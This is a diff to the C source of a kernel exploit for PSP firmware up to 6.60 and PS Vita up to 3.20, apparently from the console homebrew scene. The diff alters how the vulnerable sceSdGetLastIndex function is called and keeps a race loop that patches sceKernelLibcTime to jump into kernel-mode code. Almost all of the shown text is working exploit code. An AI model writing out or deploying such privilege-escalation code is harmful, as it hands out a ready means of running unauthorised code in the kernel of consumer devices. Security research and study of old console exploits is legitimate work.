@@ -5,7 +5,7 @@
  sceSdGetLastIndex Kernel Exploit for PSP up to 6.60 and PS Vita up to 3.20, both PSP and PSX exploits
 */
 
-int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
+extern int sceSdGetLastIndex(int a1, int a2, int a3);
 int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;
 
 int savedata_open = 0;
@@ -34,16 +34,10 @@ int stubScanner(u32 patch_addr, u32 orig_inst){
 
     // vulnerable function
     pspDebugScreenPrintf("Scanning vulnerable function\n");
-    _sceSdGetLastIndex = (void*)FindImportUserRam("sceChnnlsv", 0xC4C494F8);
-    if (_sceSdGetLastIndex == NULL){
-        pspDebugScreenPrintf("Opening savedata utility\n");
-        if (!savedata_open){
-            p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
-            savedata_open = 1;
-        }
-        _sceSdGetLastIndex = (void*)FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
-        if (_sceSdGetLastIndex == NULL) _sceSdGetLastIndex = (void*)FindImportUserRam("sceChnnlsv", 0xC4C494F8);
-    }
+    
+    sceKernelVolatileMemUnlock(0);
+    p5_open_savedata(0);
+
     // the function we need to patch
     libctime_addr = patch_addr;
     libctime_inst = orig_inst;
@@ -51,9 +45,7 @@ int stubScanner(u32 patch_addr, u32 orig_inst){
 
     sceKernelDcacheWritebackAll();
 
-    pspDebugScreenPrintf("_sceSdGetLastIndex: %p\n", _sceSdGetLastIndex);
-
-    return (_sceSdGetLastIndex == NULL);
+    return 0;
 }
 
 // the threads that will make sceSdGetLastIndex vulnerable
@@ -80,7 +72,7 @@ int doExploit()
 
     while (is_exploited != 1) {
         packet[9] = (u32)16;
-        _sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
+        sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
         sceKernelDelayThread(0);
         _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
         sceKernelDcacheWritebackAll();
